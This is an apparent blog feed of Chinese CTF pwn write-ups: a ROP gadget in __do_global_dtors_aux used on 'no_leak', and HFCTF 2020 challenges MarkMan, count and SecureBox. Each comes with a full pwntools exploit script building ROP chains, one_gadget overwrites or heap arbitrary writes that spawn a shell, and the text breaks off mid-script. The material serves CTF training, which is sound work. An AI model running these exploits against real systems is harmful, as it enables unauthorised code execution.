href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="noopener">浅析ROP之Stack Smash</a></p><p> <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">Environ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。&lt;/p&gt;
&lt;h1 id=&quot;利用思路&quot;&gt;&lt;a href=&quot;#利用思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/21/%C2%96do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/21/do-global-dtors-aux的gadget/</id>
    <published>2020-04-21T03:30:39.000Z</published>
    <updated>2020-04-28T16:49:57.831Z</updated>
    
    <content type="html"><![CDATA[<p>_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的<code>ret2_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@--name:/ctf/work/eonew/noleak<span class="comment"># ROPgadget --binary no_leak | grep rbp</span></span><br><span class="line">0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004004a9 : je 0x4004c0 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004004eb : je 0x400500 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret</span><br><span class="line">0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004b8 : pop rbp ; ret</span><br></pre></td></tr></table></figure><p><code>0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</code> 这个gadget位于</p><p>_do_global_dtors_aux中 只要控制rbp和edx的值就可以任意修改栈上的数据</p><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no_leak"></a>no_leak</h2><p>栈溢出，没有可泄露的函数，第一感觉是用<code>ret2_dl_runtime_resolve</code>,但尝试之后发现这道题在伪造调用<code>dl_runtime_resolve</code>的时候会跳转到一个未知的地方，而且溢出的字节有点少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路如下:</p><p>1、栈迁移到bss上</p><p>2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布</p><p>3、找一个能用的真实地址，利用神奇的gadget，把它伪造成system，再次回跳到main函数</p><p>4、栈溢出构造<code>system(&#39;/bin/sh&#39;)</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"no_leak"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'nc.eonew.cn'</span>, <span class="number">10002</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line">dbg(<span class="number">0x400537</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">'__libc_start_main'</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">pause()</span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">'/bin/sh\x00'</span>+<span class="string">'b'</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,fini,init)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>修改<code>0x601458</code>处的地址，经过加减得到<code>__libc_system</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-1.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的&lt;code&gt;ret2_dl_runtime_resolve&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn witeup</title>
    <link href="https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/"/>
    <id>https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/</id>
    <published>2020-04-20T01:31:03.000Z</published>
    <updated>2020-04-24T02:13:47.864Z</updated>
    
    <content type="html"><![CDATA[<p>虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题</p><h2 id="MarkMan"><a href="#MarkMan" class="headerlink" title="MarkMan"></a>MarkMan</h2><p>这个题耗费了太多时间，程序给了puts函数地址,存在一个任意地址写三字节，任意地址尝试了很多地方，刚开始想往stack上写未果，又往<code>dlopen</code>的<code>_dlfcn_hook</code> 上写未果，最终在exit函数会调用<code>_rtld_global</code>结构中的<code>_dl_rtld_lock_recursive</code>或者<code>_dl_rtld_unlock_recursive</code>处改写成功 ，并且因为<code>_dl_rtld_lock_recursive</code>指向的内容距离 <code>libc.address</code>过大，修改后三字节只会有几率成功</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level   = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#p=remote('39.97.210.182',10055)</span></span><br><span class="line">elf=ELF(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *$rebase(0xcbc)\nb *$rebase(0xcc1)\nb *$rebase(0xd63)\n")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"target near: 0x"</span>)</span><br><span class="line">leak=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">'leak =&gt; &#123;0&#125;'</span>.format(hex(leak)))</span><br><span class="line">success(<span class="string">'libc_address =&gt; &#123;0&#125;'</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">dlfcn_hook=libc.address+(<span class="number">0x15555532d0a0</span><span class="number">-0x155554d60000</span>)</span><br><span class="line">dl_rtld_lock_recursive=libc.address+(<span class="number">0x7f8a645fbf60</span><span class="number">-0x7f8a63dde000</span>)</span><br><span class="line">success(<span class="string">'dl_rtld_lock_recursive =&gt; &#123;0&#125;'</span>.format(hex(dl_rtld_lock_recursive)))</span><br><span class="line">success(<span class="string">'dlfcn_hook =&gt; &#123;0&#125;'</span>.format(hex(dlfcn_hook)))</span><br><span class="line">p.sendline(str(int(dl_rtld_lock_recursive)))</span><br><span class="line"></span><br><span class="line">payload=libc.address+one[<span class="number">1</span>]</span><br><span class="line">info(hex(payload))</span><br><span class="line">yi=payload&amp;<span class="number">0xff</span></span><br><span class="line">er=(payload&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">san=(payload&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">info(hex(yi))</span><br><span class="line">info(hex(er))</span><br><span class="line">info(hex(san))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(yi))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(er))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(san))</span><br><span class="line">p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">con=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> con:</span><br><span class="line"><span class="keyword">print</span> con</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p><code>arm aarch64</code>架构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过覆盖目标变量的值即可getshell</p><p>本地运行需要安装所需要的库 ,搜索aarch64的交叉编译的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo apt-cache search aarch64</span><br><span class="line">cpp-5-aarch64-linux-gnu - GNU C preprocessor</span><br><span class="line">cpp-aarch64-linux-gnu - GNU C preprocessor (cpp) <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">g++-5-aarch64-linux-gnu - GNU C++ 编译器</span><br><span class="line">g++-aarch64-linux-gnu - GNU C++ compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">gcc-5-aarch64-linux-gnu - GNU C 编译器</span><br><span class="line">gcc-5-aarch64-linux-gnu-base - GCC, the GNU Compiler Collection (base package)</span><br><span class="line">gcc-aarch64-linux-gnu - GNU C compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">binutils-aarch64-linux-gnu - GNU binary utilities, <span class="keyword">for</span> aarch64-linux-gnu target</span><br><span class="line">qemu-system-arm - QEMU full system emulation binaries (arm)</span><br></pre></td></tr></table></figure><p>安装所需要的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5-aarch64-linux-gnu gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.210.182'</span>,<span class="string">'40285'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line">    <span class="comment">#os.system("gdb -q -ex 'target remote localhost:1234' ")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>) :</span><br><span class="line">p. recvuntil(<span class="string">"~Math: "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">" = "</span>)[:<span class="number">-3</span>]</span><br><span class="line">answer = eval(data)</span><br><span class="line">p. sendline(str(answer))</span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">0x64</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p. sendline(payload)</span><br><span class="line">p. interactive()</span><br></pre></td></tr></table></figure><h2 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h2><p>申请空间的函数,在判断size是否大于0xFFF的时候变量强制转化成了int类型,则有整型溢出,又当申请一个很大的空间的时候,由于空间肯定不够,最终不会申请,对应的指针位置为0,则此刻有了一个超大的size,以及指针以0为初始位置,即可实现任意写,最后将接受到的key值逆序与需要写的内容异或,通过enc函数则可往目标地址写上所需写的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,sign = <span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    p.recvuntil(<span class="string">'Key: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(idx,off,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'16'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Msg: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Box ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Msg: \n'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x500</span>)</span><br><span class="line">leak(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = [<span class="number">0xCB79A</span>,<span class="number">0xCB79D</span>,<span class="number">0xCB7A0</span>,<span class="number">0xE926B</span>, <span class="number">0xE9277</span>]  <span class="comment">#Kali 2.30</span></span><br><span class="line">rce = libc_base + one_gadget[<span 